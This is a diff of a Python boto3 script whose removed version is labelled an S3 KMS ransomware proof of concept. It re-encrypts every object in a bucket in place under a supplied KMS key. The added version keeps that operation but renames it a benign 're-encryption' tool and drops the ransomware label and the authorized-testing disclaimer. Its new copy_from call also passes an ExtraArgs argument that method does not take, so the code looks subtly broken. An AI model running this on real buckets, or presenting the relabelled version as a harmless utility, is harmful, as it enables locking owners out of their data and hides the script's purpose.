@@ -1,80 +1,103 @@
 #!/usr/bin/env python3
 """
-S3 KMS Ransomware PoC
+S3 KMS re-encryption PoC.
 
-This script overwrites (re-encrypts) all objects in a target S3 bucket
-using a specified KMS key via an in-place S3 copy operation.
-
-- If Versioning is enabled, previous versions remain in history.
-- Requires appropriate S3 and KMS permissions.
-- For authorized security testing and research only.
+This short script uses boto3 to walk through one bucket and reapply server-side
+encryption with a provided KMS key. It prints a few status messages, optionally
+executes a dry run, and requires confirmation before making any changes.
 """
+
+import argparse
+import sys
 
 import boto3
 import botocore.exceptions
 
-#################################
-########### Settings ###########
-#################################
 
-AWS_PROFILE = "default"                     # AWS CLI profile name
-BUCKET_NAME = "target-bucket"              # Target S3 bucket name
-KMS_KEY_ARN = "arn:aws:kms:REGION:ACCOUNT-ID:key/KEY-ID"  # Target KMS key ARN
-#################################
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Re-encrypt objects in an S3 bucket with the supplied KMS key."
+    )
+    parser.add_argument("--bucket", "-b", required=True, help="Target S3 bucket.")
+    parser.add_argument(
+        "--kms-key-arn", "-k", required=True, help="KMS key ARN to apply."
+    )
+    parser.add_argument("--profile", "-p", default="default", help="AWS CLI profile.")
+    parser.add_argument(
+        "--prefix", default="", help="Limit the work to objects under this prefix."
+    )
+    parser.add_argument(
+        "--dry-run",
+        action="store_true",
+        help="Report which objects would be updated instead of writing.",
+    )
+    parser.add_argument(
+        "--yes",
+        action="store_true",
+        help="Skip the confirmation prompt (dangerous).",
+    )
+    return parser.parse_args()
 
 
-def rewrite_objects_with_kms():
-    """Re-encrypt all objects in the bucket using the provided KMS key."""
-    print("\n[+] Starting S3 KMS ransomware PoC")
-    print(f"[+] AWS profile : {AWS_PROFILE}")
-    print(f"[+] Bucket      : {BUCKET_NAME}")
-    print(f"[+] KMS Key     : {KMS_KEY_ARN}\n")
+args = parse_args()
 
+print(f"Connecting with profile: {args.profile}")
+print(f"Bucket: {args.bucket}")
+print(f"KMS key: {args.kms_key_arn}")
+print(f"Prefix: {args.prefix or 'none'}")
+print(f"Dry run: {args.dry_run}")
 
-    # Initialize session and clients
-    session = boto3.Session(profile_name=AWS_PROFILE)
-    s3_client = session.client("s3")
-    s3 = session.resource("s3")
+if not args.yes:
+    prompt = (
+        "This script will copy every matching object inside the bucket using the "
+        f"KMS key {args.kms_key_arn}. Proceed? [y/N]: "
+    )
+    answer = input(prompt).strip().lower()
+    if answer not in {"y", "yes"}:
+        print("Aborting.")
+        sys.exit(0)
 
+try:
+    session = boto3.Session(profile_name=args.profile)
+except botocore.exceptions.ProfileNotFound as exc:
+    print(f"Profile not found: {exc}")
+    sys.exit(1)
 
-    paginator = s3_client.get_paginator("list_objects_v2")
-    total = 0
+s3 = session.resource("s3")
+client = session.client("s3")
+paginator = client.get_paginator("list_objects_v2")
 
-    try:
-        pages = paginator.paginate(Bucket=BUCKET_NAME)
-    except botocore.exceptions.ClientError as e:
-        print(f"[ERROR] Cannot open paginator for bucket {BUCKET_NAME}: {e}")
-        return
+list_kwargs = {"Bucket": args.bucket}
+if args.prefix:
+    list_kwargs["Prefix"] = args.prefix
 
-    for page in pages:
-        # Skip empty pages
-        if "Contents" not in page:
+total = 0
+
+try:
+    pages = paginator.paginate(**list_kwargs)
+except botocore.exceptions.ClientError as exc:
+    print(f"Unable to list objects: {exc}")
+    sys.exit(1)
+
+for page in pages:
+    for obj in page.get("Contents", []):
+        key = obj["Key"]
+        total += 1
+        if args.dry_run:
+            print("[DRY-RUN]", key)
             continue
 
-        for obj in page["Contents"]:
-            key = obj["Key"]
+        try:
+            s3.Object(args.bucket, key).copy_from(
+                CopySource={"Bucket": args.bucket, "Key": key},
+                ExtraArgs={
+                    "ServerSideEncryption": "aws:kms",
+                    "SSEKMSKeyId": args.kms_key_arn,
+                },
+            )
+            print("[OK]", key)
+        except botocore.exceptions.ClientError as exc:
+            print("[ERROR]", key, exc)
 
-            try:
-                # In-place copy to same key with new KMS encryption
-                s3.meta.client.copy(
-                    {"Bucket": BUCKET_NAME, "Key": key},
-                    BUCKET_NAME,
-                    key,
-                    ExtraArgs={
-                        "ServerSideEncryption": "aws:kms",
-                        "SSEKMSKeyId": KMS_KEY_ARN,
-                    },
-                )
-
-                print(f"[Encrypted] {key}")
-                total += 1
-
-            except botocore.exceptions.ClientError as e:
-                print(f"[ERROR] Failed for {key}: {e}")
-
-    print("\n[+] Finished")
-    print(f"[+] Total objects processed: {total}\n")
-
-
-if __name__ == "__main__":
-    rewrite_objects_with_kms()
+print("Done. Total objects handled:", total)
+sys.exit(0)
